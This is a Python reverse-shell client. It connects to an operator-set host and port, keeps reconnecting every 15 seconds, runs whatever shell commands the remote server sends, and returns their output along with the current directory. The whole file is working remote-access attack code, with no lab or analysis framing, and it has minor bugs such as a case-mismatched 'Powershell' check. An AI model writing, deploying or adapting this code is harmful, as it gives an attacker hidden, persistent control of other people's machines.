import socket
import os
import subprocess
import time
from datetime import datetime

SERVER_HOST = "127.0.0.1" # change it with your ip
SERVER_PORT = 7637
BUFFER_SIZE = 1024 * 128 
# separator string for sending 2 messages in one go
SEPARATOR = "<sep>"

# get time/date
def getime():
    current_time = datetime.now()
    print(current_time)

# connecction 
def connect_to_server():
    global s
    try:
        global s
        s = socket.socket()
        s.connect((SERVER_HOST, SERVER_PORT))
        cwd = os.getcwd()
        s.send(cwd.encode())
    except:
        time.sleep(15)
        connect_to_server()
connect_to_server()


while True:
    # receive the command from the server
    command = s.recv(BUFFER_SIZE).decode()
    splited_command = command.split()
    if command.lower() == "exit":
        connect_to_server()


    if splited_command[0].lower() == "cd":
        try:
            os.chdir(' '.join(splited_command[1:]))
        except FileNotFoundError as e:
            output = str(e)
        else:
            # if operation is successful, empty message
            output = ""
    # FIX BUGS
    elif splited_command[0].lower() == "cmd":
        output = "cmd doesn't work!\n"
    elif splited_command[0].lower() == "Powershell":
        output = "Powershell doesn't work!\n"
    elif splited_command[0].lower() == "date":
        output = getime()
    elif splited_command[0].lower() == "more":
       output = "more doesn't work!\n"
    elif splited_command[0].lower() == "start":
        output = "start doesn't work!\n"
    elif splited_command[0].lower() == "nano":
        output = "nano doesn't work!\n"
    elif splited_command[0].lower() == "time":
        output = getime()
    elif splited_command[0].lower() == "python":
        output = "Python doesn't work!\n"
    else:
        # execute the command and retrieve the results
        output = subprocess.getoutput(command)
    cwd = os.getcwd()
    message = f"{output} {cwd}" # {SEPARATOR}
    s.send(message.encode())

# close client connection
s.close()